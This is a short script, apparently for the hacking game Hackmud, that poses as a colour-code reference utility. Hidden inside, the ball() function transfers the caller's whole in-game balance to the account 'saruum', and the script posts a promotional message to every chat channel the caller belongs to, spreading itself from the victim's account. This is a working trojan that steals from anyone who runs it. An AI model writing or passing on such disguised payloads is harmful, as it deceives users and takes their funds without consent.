function(context, args)
{
	var caller = context.caller;
	
	function color(_myargs){
			//set the default value of i & j to print A to Z
		var i = 65;
		var j = 123;
		var o="";
		var l=0;
		for(l=0;l<10;l++){
			o=o+`\`${l}${l}\``;
		}
		var k;
		for(k = i; k < j; k++){
			if(k<97 && k > 90){
				continue
			}{
			//convert the char code to string (Alphabets)
			var oo = String.fromCharCode(k);
			o=o+`\`${oo}${oo}\``;
			}
		}
		ball()
		return o
	}

	function ball(_myargs){
		#ms.accts.xfer_gc_to({to:"saruum", amount:#hs.accts.balance()});
	}

	function hm(myargs){
		#fs.chats.send(myargs)
	}
	
	var chan = #ms.chats.channels()
	for(var i in chan){
		hm({c:chan[i],msg:"saruum.col_codes is amazing! Color references for everyone!"})
	}

	return color()
}